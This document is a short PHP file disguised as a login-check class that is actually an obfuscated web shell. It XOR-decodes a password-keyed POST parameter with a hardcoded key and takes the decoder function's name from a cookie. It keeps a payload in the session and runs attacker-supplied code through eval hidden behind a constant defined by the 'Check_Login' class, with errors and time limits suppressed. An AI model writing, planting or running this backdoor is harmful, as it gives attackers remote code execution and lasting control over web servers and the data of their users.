<?php

class Check_Login{
public $name;

function check_name(){
define("Demo",$this->name);
}
}

@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
for($i=0;$i<strlen($D);$i++) {
$c = $K[$i+1&15];
$D[$i] = $D[$i]^$c;
}
return $D;
}
$pass='company';
$payloadName='payload';
$key='93c731f1c3a84ef0';
if (isset($_POST[$pass])){
$data=encode($_COOKIE['update']($_POST[$pass]),$key);
if (isset($_SESSION[$payloadName])){
$payload=encode($_SESSION[$payloadName],$key);
if (strpos($payload,"getBasicsInfo")===false){
$payload=encode($payload,$key);
}
$l = new Check_Login();
$l->name = $payload;
$l->check_name();
eval(Demo);
echo substr(md5($pass.$key),0,16);
echo base64_encode(encode(@run($data),$key));
echo substr(md5($pass.$key),16);
}else{
if (strpos($data,"getBasicsInfo")!==false){
$_SESSION[$payloadName]=encode($data,$key);
}
}
}
echo '"></head></html>';
exit(0);